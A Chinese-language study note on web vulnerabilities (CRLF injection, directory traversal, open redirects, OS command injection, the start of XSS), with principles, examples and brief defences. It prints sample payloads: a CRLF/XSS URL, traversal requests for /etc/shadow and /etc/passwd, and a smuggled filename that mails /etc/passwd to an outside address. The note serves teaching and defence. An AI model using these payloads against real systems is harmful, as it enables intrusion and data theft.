- [CRLF注入攻击——CRLF Injection](#crlf注入攻击crlf-injection)
    - [原理](#原理)
    - [示例](#示例)
    - [防范措施](#防范措施)
    - [参考链接](#参考链接)
- [目录遍历攻击——Directory Traversal](#目录遍历攻击directory-traversal)
    - [原理](#原理-1)
    - [示例](#示例-1)
        - [通过URL](#通过url)
        - [通过变量名](#通过变量名)
    - [防范措施](#防范措施-1)
    - [参考链接](#参考链接-1)
- [开放重定向——Open Redirects](#开放重定向open-redirects)
    - [原理](#原理-2)
    - [示例](#示例-2)
    - [防范措施](#防范措施-2)
- [OS命令注入——OS Command Injection](#os命令注入os-command-injection)
    - [原理](#原理-3)
    - [示例](#示例-3)
    - [防范措施](#防范措施-3)
- [SQL注入](#sql注入)
- [跨站脚本攻击——XSS](#跨站脚本攻击xss)
- [原理](#原理-4)

# CRLF注入攻击——CRLF Injection

## 原理

CRLF是”回车 + 换行”（\r\n）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。

## 示例

比如一个网站接受url参数`http://test.sina.com.cn/?url=xxx`，xxx放在Location后面作为一个跳转。如果我们输入的是

```
http://test.sina.com.cn/?url=%0d%0a%0d%0a<img src=1 onerror=alert(/xss/)>
```

我们的返回包就会变成这样：

```
HTTP/1.1 302 Moved Temporarily 
Date: Fri, 27 Jun 2014 17:52:17 GMT 
Content-Type: text/html 
Content-Length: 154 
Connection: close 
Location:
<img src=1 onerror=alert(/xss/)>
```

之前说了浏览器会根据第一个CRLF把HTTP包分成头和体，然后将体显示出来。于是我们这里这个标签就会显示出来，造成一个XSS。

## 防范措施

过滤\r 、\n之类的换行符，避免输入的数据污染到其他HTTP头。

## 参考链接

https://wps2015.org/drops/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html

*********************************************

# 目录遍历攻击——Directory Traversal

## 原理

又称Path Traversal attack，即目录遍历攻击，旨在访问web服务器根目录外的文件/目录。通过是通过url或变量里头传递"../"来进行目录遍历。

## 示例

### 通过URL

比如：`http://some_site.com.br/../../../../some dir/some file `
或者：`http://some_site.com.br/../../../../etc/shadow `

### 通过变量名

通常是在文件下载接口中，
比如：`http://some_site.com.br/get-files?file=/etc/passwd `
或者：`http://some_site.com.br/get-files?file=../../../../some dir/some file `

## 防范措施

1. 依赖框架
2. 对变量名进行过滤。

## 参考链接

https://my.oschina.net/go4it/blog/1594048

*******************************************************************************************************************

# 开放重定向——Open Redirects

## 原理

开放重定向出现在应用接受参数并将用户重定向到该参数值，并且没有对该值进行任何校验的时候。

## 示例

假设有一个正规网站http://nerddinner.com/，还有一个恶意网站或钓鱼网站http://nerddiner.com/（注意：这里少了个n）。
一天，小白收到了别人发的链接：http://nerddinner.com/Account/LogOn?returnUrl=http://nerddiner.com。
1. 打开链接后进入了登录界面，小白输入了自己的帐号名密码进行登录。
2. 登录成功后重定向到了恶意网站。
3. 恶意网站是一个仿造正规网站的登录页面，并在上面提示用户名或密码错误。
4. 小白按照提示重新输入了帐号密码信息。
5. 恶意网站保存了客户的用户名密码，然后重定向会正规网站。
6. 小白继续平时正常的操作。

## 防范措施

防止开发重定向只需要判断重定向的链接是本地的链接或者是合法的链接即可。
1. 如果登录链接和站点其他页面都在同一个域名，在ASP.MVC中可以用Url.IsLocalUrl(string url)来判断。
2. 如果登录链接和站点其他页面不在同一个域名，如单点登录，则需要自己去实现判断的逻辑。

*******************************************************************************************************************

# OS命令注入——OS Command Injection

## 原理

OS 注入攻击是指程序提供了直接执行 Shell 命令的函数的场景，当攻击者不合理使用，且开发者对用户参数未考虑安全因素的话，就会执行恶意的命令调用，被攻击者利用。

## 示例

在 Node.js 中可以使用 exec() 执行命令。以基于 ThinkJS 开发的博客系统 Firekylin 为例，其中有一个用户上传压缩包导入数据的功能，为了方便直接使用了 tar 命令去解压文件，大致代码如下：

```js
const { exec } = require('child_process');

const extractPath = path.join(think.RUNTIME_PATH, 'importMarkdownFileToFirekylin');
module.exports = class extends think.Controller {
    async upload() {
        const { path: filePath } = this.file('import');
        exec(`rm -rf ${extractPath}; mkdir ${extractPath}; cd ${PATH}; tar zvxf "${filePath}"`);
    }
}
```

其中 filePath 是用户上传文件的包含文件名的临时上传路径。假设此时用户上传的文件名为 $(whoami).tar.gz，那么最后 exec() 就相当于执行了 tar zvxf "/xxx/runtime/$(whoami).tar.gz"。而 Bash 的话双引号中的 $() 包裹部分会被当做命令执行，最终达到了用户超乎程序设定直接执行 Shell 命令的可怕结果。类似的写法还有 `` 包裹。当然我这里写的是 whoami 命令显得效果还好，如果是 $(cat /etc/passwd | mail -s "host" i@imnerd.org).tar.gz 能直接获取到机器密码之类的就能体会出这个漏洞的可怕了吧。

## 防范措施

1. 参数化
2. 输入校验

*******************************************************************************************************************

# SQL注入


*******************************************************************************************************************

# 跨站脚本攻击——XSS

# 原理

跨站脚本攻击(Cross Site Scripting)，缩写为XSS。恶意攻击者往Web页面里插入恶意javaScript代码，当用户浏览该页之时，嵌入其中Web里面的javaScript代码会被执行，从而达到恶意攻击用户的目的。

XSS攻击的分类:
* 反射型：又称为非持久性跨站点脚本攻击。漏洞产生的原因是攻击者注入的数据反映在响应中。非持久型XSS攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。也就是我上面举的那个简单的XSS攻击案例，通过url参数直接注入。然后在响应的数据中包含着危险的代码。当黑客把这个链接发给你，你就中招啦！
* 存储型：又称为持久型跨站点脚本，它一般发生在XSS攻击向量(一般指XSS攻击代码)存储在网站数据库，当一个页面被用户打开的时候执行。持久的XSS相比非持久性XSS攻击危害性更大,容易造成蠕虫，因为每当用户打开页面，查看内容时脚本将自动执行。